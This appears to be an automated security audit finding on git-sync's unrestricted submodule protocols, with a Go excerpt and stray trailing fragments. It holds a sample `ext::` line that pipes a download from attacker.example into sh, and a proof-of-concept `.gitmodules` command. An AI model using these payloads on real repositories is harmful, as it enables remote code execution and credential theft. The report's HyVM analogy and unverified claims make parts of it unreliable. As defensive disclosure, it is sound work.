### Title
Unrestricted git-submodule protocol handling in git-sync allows attacker-pushed `.gitmodules` to trigger arbitrary command execution / destructive filesystem operations (`ext::` / local-path submodules) - (File: main.go)

### Summary
The HyVM report's core issue is that an untrusted, attacker-reachable instruction (`callcode`) has no restriction on what it can target, letting an attacker chain it into a destructive primitive (`selfdestruct`). The equivalent unrestricted primitive in git-sync is `git submodule update --init [--recursive]`, invoked automatically on every sync from data that is fully attacker-controlled (the `.gitmodules` file of the tracked, untrusted upstream repository), with no protocol allow-listing configured by git-sync.

### Finding Description
`git-sync`'s sync loop calls `configureWorktree`, which — whenever `--submodules` is not `off` (the default is `recursive`) — runs `git submodule update --init --recursive` (optionally with `--depth`) directly against the just-checked-out worktree: [2](#0-1) 

The submodule URLs and paths processed by this command come entirely from the `.gitmodules` file committed to the synced repository, i.e., from content an attacker who can push to (or control) the upstream `--repo` fully controls. `git-sync` never restricts the git "transport helper" protocols that `git submodule update` is allowed to use — there is no `protocol.ext.allow`, `protocol.file.allow`, `GIT_ALLOW_PROTOCOL` environment variable, or equivalent hardening anywhere in `main.go`'s git configuration setup: [1](#0-0)  The `SetupDefaultGitConfigs` function only sets GC and credential-helper related keys, and `SetupExtraGitConfigs` merely lets the *operator* add more config, not restrict submodule protocols by default: [3](#0-2) 

Git natively supports submodule URLs using the `ext::` transport helper (e.g. `ext::sh -c "curl attacker.example/x|sh"`) or arbitrary local file paths (`file://` / bare paths), both of which are normally recommended to be locked down via `protocol.ext.allow=never` / `protocol.file.allow=user` in any tool that clones or updates submodules from untrusted sources (this is the well-documented git submodule RCE class, e.g. CVE-2022-39253 and related git advisories). Because `git-sync`'s repoSync struct passes no such protocol restriction when constructing the `submodule update` invocation, an attacker with push access to the tracked repository (the same threat actor implied by "attacker-pushed commit" in this analysis) can add/modify `.gitmodules` to point a submodule at an `ext::` URL, and on the next sync cycle `git-sync` will execute it as the process's own UID inside the sidecar container — exactly analogous to HyVM's unrestricted `callcode` letting an attacker reach an arbitrarily destructive primitive (`selfdestruct`) via attacker-supplied call target.

### Impact Explanation
If exploited, this yields arbitrary command execution inside the git-sync sidecar container, which typically has access to shared volumes, service credentials, SSH keys, and tokens configured for `--repo` access (`--password-file`, `--ssh-key-file`, GitHub App private key, etc., all read from disk by `repoSync`). This exceeds "destroy the contract" (HyVM's selfdestruct outcome): it can lead to credential/token disclosure, persistent sync denial (attacker can corrupt the `--root` directory, worktrees, or the published symlink target so consumers get wrong/partial/no content), or file write/delete outside the intended target if the malicious submodule path escapes the worktree via crafted relative paths. This directly maps to the "Accept" criteria of code execution, credential disclosure, and publishing wrong/partial content or persistent sync denial.

### Likelihood Explanation
Likelihood is high for any deployment where `--repo` is not fully trusted (e.g., synced from a repo where third parties can open PRs that get merged automatically, or where the upstream repo itself could be compromised), because `--submodules=recursive` is the *default* — an operator does not need to opt in to submodule processing, and no protocol hardening flag exists to opt out of the dangerous transports. This mirrors HyVM's "no restriction, anyone can trigger" characterization.

### Recommendation
- **Short term:** Before running `git submodule update`, set `protocol.ext.allow=never` and restrict `protocol.file.allow` (e.g., to `user` or `never`) in the private gitconfig git-sync already creates for itself, and/or set `GIT_ALLOW_PROTOCOL` to an explicit allow-list (e.g., `https,ssh`) for the submodule-update invocation. Document this restriction clearly, similar to the "remove callcode" short-term fix.
- **Long term:** Provide an explicit flag (e.g., `--submodule-allowed-protocols`) so operators consciously opt into any non-default transports, and add e2e tests asserting that `ext::`/local-file submodule URLs are rejected by default, analogous to "carefully review every opcode/primitive used and justify its presence."

### Proof of Concept
1. Attacker with push/merge access to the tracked `--repo` (or one that gets code merged, e.g. via PR) adds a `.gitmodules` entry: `[submodule "x"] path = x url = ext::sh -c "id > /tmp/pwned; exec false"`.
2. Attacker commits and pushes; `git-sync`'s next periodic sync (`--period`) detects the new hash via `fetch`/`SyncRepo` and calls `configureWorktree`, which runs `git submodule update --init --recursive` [2](#0-1) .
3. Because no `protocol.ext.allow` restriction is configured anywhere in `SetupDefaultGitConfigs`/`SetupExtraGitConfigs` [3](#0-2) , git invokes the `ext::` helper, executing `sh -c "id > /tmp/pwned; exec false"` inside the git-sync container with the process's UID/GID and any mounted credentials.

Note: I was unable to fully verify whether any *newer* commit history or a config file outside the indexed context (e.g., a Dockerfile-level `git config --system` hardening) sets protocol restrictions, since the codebase index may not include every file; a full repository check via a Devin session would be needed to conclusively rule out an existing mitigation.

// SetupDefaultGitConfigs configures the global git environment with some
// default settings that we need.
func (git *repoSync) SetupDefaultGitConfigs(ctx context.Context) error {
	configs := []keyVal{{
		// Never auto-detach GC runs.
		key: "gc.autoDetach",
		val: "false",
	}, {
		// Fairly aggressive GC.
		key: "gc.pruneExpire",
		val: "now",
	}, {
		// How to manage credentials (for those modes that need it).
		key: "credential.helper",
		val: "cache --timeout 3600",
	}, {
		// Never prompt for a password.
		key: "core.askPass",
		val: "true",
	}}

	for _, kv := range configs {
		if _, _, err := git.Run(ctx, "", "config", "--global", kv.key, kv.val); err != nil {
			return fmt.Errorf("error configuring git %q %q: %w", kv.key, kv.val, err)
		}
	}
	return nil
}

		}
	}

	return nil
}
